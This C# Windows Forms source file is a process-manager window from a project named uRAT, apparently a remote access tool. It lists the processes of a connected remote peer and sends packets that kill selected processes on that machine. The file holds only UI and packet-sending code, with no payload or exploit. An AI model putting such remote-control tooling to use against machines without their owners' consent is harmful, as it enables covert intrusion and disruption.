using System;
using System.Drawing;
using System.Windows.Forms;
using uRAT.ManagersPlugin.ProcessManager.Operations;
using uRAT.ManagersPlugin.ProcessManager.Packets;
using uRAT.ManagersPlugin.Tools;
using uRAT.Server.Tools.Extensions;

namespace uRAT.ManagersPlugin.ProcessManager.Forms
{
    public partial class ProcessManagerForm : Form
    {
        private ProcessManagerOperation _operation;
        

        public ProcessManagerForm(string peerName, ProcessManagerOperation operation)
        {
            InitializeComponent();
            Text = "Process manager - " + peerName;

            _operation = operation;
            _operation.OnPacketReceived += OperationPacketReceived;
            _operation.SendPacket(new RefreshProcessesPacket());
        }

        void OperationPacketReceived(object sender, uNet2.Packet.Events.OperationPacketEventArgs e)
        {
            if (e.Packet is ProcessInformationPacket)
            {
                var packet = e.Packet as ProcessInformationPacket;
                var lvItm = new ListViewItem(packet.ProcessName);
                lvItm.SubItems.Add(packet.Pid.ToString());
                lvItm.SubItems.Add(packet.MemUsage.ToString("N0") + " K");
                if (packet.IsThis)
                    lvItm.BackColor = Color.LightBlue;
                listView1.FlexibleInvoke(lv => lv.Items.Add(lvItm));
            }
        }

        private void toolStripTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void ProcessManagerFrm_Load(object sender, EventArgs e)
        {

        }

        private void ProcessManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            _operation.CloseOperation();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            _operation.SendPacket(new RefreshProcessesPacket());
        }

        private void stopProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvItm in listView1.SelectedItems)
            {
                _operation.SendPacket(new KillProcessPacket(Int32.Parse(lvItm.SubItems[1].Text)));
            }

            if (listView1.SelectedItems.Count > 0)
            {
                listView1.Items.Clear();
                _operation.SendPacket(new RefreshProcessesPacket());
            }
        }
    }
}
